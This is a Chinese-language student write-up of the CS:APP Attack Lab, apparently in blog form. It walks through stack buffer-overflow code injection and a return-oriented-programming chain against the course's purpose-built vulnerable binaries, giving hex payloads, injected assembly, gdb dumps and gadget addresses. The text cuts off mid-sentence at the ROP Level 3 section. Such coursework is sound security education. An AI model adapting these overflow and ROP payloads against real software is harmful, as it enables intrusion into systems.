# Part I: Code Injection Attacks

这一部分的讲义中提到程序设定为运行时栈内存的地址不发生变化，因此通过`gdb`可以查看内存，进行数据和代码的注入。

## Level 1

这部分实验主要是学会分析程序，了解代码注入的基本原理。首先我们看一下测试的`test()`代码：

```c
int test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

这部分代码表明用一个`getbuf`函数进行读取，而上文已经给出了`getbuf`函数的代码：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

其中`Get`函数封装了`get`函数。这里新开了一个大小为`BUFFER_SIZE`大小的char array，将输入的缓存存储在array中，并返回。我们的注入的代码或者数据只能通过这个唯一的输入口来完成，因此需要构造出可以进行攻击的字节序列。由于C的数组并没有边界检查，因此

通过命令反编译得到`ctarget`的汇编代码`ctarget.asm`：

```bash
objdump -d ctarget > ctarget.asm
```

查看汇编程序的`getbuf`函数：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

可以发现这里使用栈来存储char array的内容。完成后将栈顶指针复原并返回。这里的`BUFFER_SZIE`的值为`0x28(=40)`。而栈顶指针复原后即返回函数。我们知道`retq`指令将栈顶存储的地址作为返回值进行跳转。我们希望跳转到`touch1()`，因此就将这个函数的地址`0x4017c0`作为跳转的地址覆盖`test()`函数的返回地址，这样就可以完成跳转。

总的来说，我们将希望跳转的地址写到一个字符序列中，让输入的字符产生越界，覆盖原本的返回地址，跳转到我们期望的地址。由于部分字符无法通过标准输入通过键盘敲出，因此附录A给出了工具`hex2raw`的程序将给定格式的十六进制数转化为对应的源字符。这里注意是从低地址写往高地址，因此返回地址组织为`c0 17 40 00 00 00 00 00`。这样我们就得到了第一个攻击序列，参考`exploit1.txt`：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

通过命令转化为字符后作为标准输入即可：

```bash
root@2e753e36cee9:/csapp/lab/target1# ./hex2raw < exploit1.txt > exploit-raw1.txt
root@2e753e36cee9:/csapp/lab/target1# ./ctarget -q < exploit-raw1.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

即可顺利完成实验。

## Level 2

这部分实验需要注入x86-64汇编代码的二进制形式，转换方法参考附录B。根据要求，我们需要把代码写到char array中。首先我们需要知道写入的地址，从而完成返回跳转。通过查看内存可以发现，当执行`getbuf()`时，栈顶指针`%rsp`指向的地址为`0x5561dc78`，查看`%rsp -> %rsp + 48`这一段内存：

```bash
(gdb) b *0x4017b4
Breakpoint 5 at 0x4017b4: file buf.c, line 16.
(gdb) r -q
Starting program: /csapp/lab/target1/ctarget -q
Cookie: 0x59b997fa
Type string:asd

Breakpoint 5, getbuf () at buf.c:16
16      in buf.c
(gdb) x /48xb $rsp
0x5561dc78:     0x61    0x73    0x64    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
```

我们函数的返回地址为`0x401976`，可以发现是返回到`test()`函数。为了正确执行`touch2()`函数且确保我们传入的参数和给定的`cookie`值相同（`0x59b997fa`），我们需要将`%rdi`的值设为cookie的值，之后改变返回地址，让程序执行`ret`指令直接跳转到`touch2()`函数中。

由于实验的讲义建议我们不要使用`jmp`或者`call`指令，因此，我们通过修改`ret`的返回地址来进行跳转。

0. 修改内存`0x5561dc78`处的值为`0x4017ec`
1. 修改返回地址执行我们注入的指令执行的地址(`0x5561dc90`)
2. 修改`%rdi`的值为cookie对应的值
3. 修改`%rsp`指向`0x5561dc78`
4. 返回

对应的汇编语句为
```s
# code12.s
movq  $0x59b997fa, %rdi       
movq  $0x5561dc78, %rsp 
retq
```

使用指令编译并进行反编译

```bash
gcc -c code12.s
objdump -d code12.o > code12.d
```

在`code12.d`中即可看到对应的汇编指令。将得到的二进制指令写入到代码注入的内存栈中即可。注入后内存内容如下：

```bash
0x5561dc78:     0xec    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0x17    0x17    0xfa    0x97    0xb9    0x59    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

## Level 3

先梳理一下这个步骤实现的思路：

第一步，逻辑上需要跳转到touch3函数中

```c
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

可以发现，`touch3()`函数需要传入一个字符串指针，并和cookie一起作为参数调用`hexmatch()`函数。因此我们再探究一下这个函数的内容：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

这个函数将我们的cookie作为val传入，并通过`sprinf()`转化为字符串存储在字符串指针`s`中，并和我们传入的字符串指针进行内容比较。

因此通过倒推可以发现，我们需要把cookie值的字符串形式作为参数传入`touch3()`，作为实验成功的必要条件，在上一部分中已经完成。但是，这一部分调用`hexmatch()`函数后，`%rsp`的值会发生变化，因此需要将cookie的字符串表示值存储在无法被覆盖的内存区域。

因此，我们需要做的工作有：
1. 将注入代码起始地址、字符串、`touch3()`函数的入口地址都存放到内存中
2. 将字符串起始地址写入`%rdi`中
3. 修改`%rsp`的值
4. 调用`retq`指令，跳转到`touch3()`函数，传入字符串的地址进行比较。汇编形式如下：

```asm
movq <ADDR_STR>, %rdi
movq <ADDR_NEW_RSP>, %rsp
retq
```

因此我们组织栈的内容如下：

```bash
0x5561dc78:     0xfa    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

成功通过测试。在`0x401854`处设置断点，运行到断点位置时查看上述内存区域：

```bash
(gdb) x /48xb 0x5561dc78
0x5561dc78:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x5561dc80:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x48    0xc7    0xc7    0x80    0xdc    0x61    0x55    0x48
0x5561dc98:     0xc7    0xc4    0x78    0xdc    0x61    0x55    0xc3    0x00
0x5561dca0:     0x90    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

可以发现由于我们注入的`retq`指令调用后，栈指针向高地址移动后，原来的内容被覆盖了，因此实验讲义的advice提示我们要再三考虑存放cookie字符串的位置。

## Part II: Return-Oriented Programming

这部分实验中增加了难度：

1. 栈采用随机化，因此每次运行时栈的地址是不确定的，无法将PC指向buffer的位置；
2. 栈区的代码是不可执行的，因此即使注入了代码也会出现segmentation fault。

但是实验提供了另一种方案，参考讲义。

## Level 2

这部分实验需要实现Phase2的攻击。讲义的advice中提示栈中需要组织Gadget的地址和数据的混合，因此尽管逻辑上Gadget的地址组成一个链表，但是实际上我们需要把要传入的数据和Gadget地址进行混合。Gadget中可以使用`movq`指令，但是指令源寄存器数据只能由我们自己传入，因此直觉上来说数据应该这样组织：

```
Gadget_1
Data_1
Data_2
...
Data_n
Gadget_2
...
```

这样，先修改`getbuf`函数的返回地址，跳转到Gadget1，执行`popq`将`Data_i`存储到目标寄存器（设置参数），栈顶指针移动，直到指向Gadget2的地址后，gadget1的`retq`指令将PC指向gadget2，再执行gadget2的程序，以此类推。最后把`touch3()`的地址写到最后一个gadget中跳转。

由于Phase2只需要将cookie的数值作为参数传入，结合给定的gadget farm，我们推断出如下指令可以完成任务：

```asm
58          popq %rax
48 89 c7    movq %rax, %rdi
```

此时`Data_1 = ${cookie} = 0x59b997fa`。

中间可能会出现`90`(`nop`指令)，这里忽略掉。通过检索文档可以找到包含`popq %rax`指令字节序列的gadget1：

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```

`ADDR(gadget1) = 0x4019ab`。同样的可以检索到包含`movq %rax, %rdi`指令字节序列的gadget2：

```asm
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
```

`ADDR(gadget2) = 0x4019c5`。最后将`touch3()`函数的地址作为gadget3的地址`ADDR(gadget3) = 0x4017ec`。

组织exploit的内容如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

## Level 3

这部分实验